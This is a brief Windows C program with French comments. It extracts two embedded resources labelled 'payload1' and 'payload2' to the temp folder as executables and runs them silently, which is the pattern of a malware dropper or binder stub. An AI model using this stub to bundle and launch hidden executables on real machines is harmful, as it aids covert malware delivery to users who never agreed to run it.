#include <windows.h>
#include <stdio.h>

void extract_and_run_resource(LPCSTR resName, LPCSTR fileName) {
    HRSRC hRes = FindResource(NULL, resName, RT_RCDATA);
    HGLOBAL hData = LoadResource(NULL, hRes);
    DWORD size = SizeofResource(NULL, hRes);
    void* data = LockResource(hData);

    // Écrire dans un fichier temporaire
    char tempPath[MAX_PATH];
    GetTempPathA(MAX_PATH, tempPath);
    strcat(tempPath, fileName);

    FILE* fp = fopen(tempPath, "wb");
    fwrite(data, 1, size, fp);
    fclose(fp);

    // Lancer le .exe extrait
    STARTUPINFOA si = { sizeof(si) };
    PROCESS_INFORMATION pi;
    CreateProcessA(tempPath, NULL, NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi);

    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);
}

int main() {
    extract_and_run_resource("payload1", "tool1.exe");
    extract_and_run_resource("payload2", "tool2.exe");
    return 0;
}
